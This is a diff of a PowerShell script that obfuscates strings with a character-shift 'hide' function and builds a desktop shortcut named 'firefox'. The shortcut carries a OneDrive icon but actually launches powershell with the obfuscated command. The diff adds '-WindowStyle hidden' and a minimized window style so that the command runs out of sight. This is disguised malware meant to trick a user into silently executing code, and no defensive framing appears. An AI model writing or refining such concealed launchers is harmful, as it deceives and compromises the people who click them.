@@ -20,6 +20,7 @@ $fix = @'
 function hide{
     param([string]$plaintext)
     (($plaintext-split''|%{[int][char]$_+$offset}|%{[char]$_})-join'' -replace '`','``' -replace "'",$fix) -replace "^",$start -replace '$',$end -replace 'johnxor','_'
+
 }
 
 $strings = $strings|%{hide($_)}
@@ -33,5 +34,6 @@ $Shortcut = $WshShell.CreateShortcut("C:\Users\"+$env:USERNAME+"\Desktop\firefox
 $Shortcut.RelativePath =  "powershell"
 $Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
 $Shortcut.TargetPath = "powershell"
-$Shortcut.Arguments = ($final)
+$Shortcut.Arguments = ("-WindowStyle hidden "+$final)
+$Shortcut.WindowStyle = 7
 $Shortcut.Save()
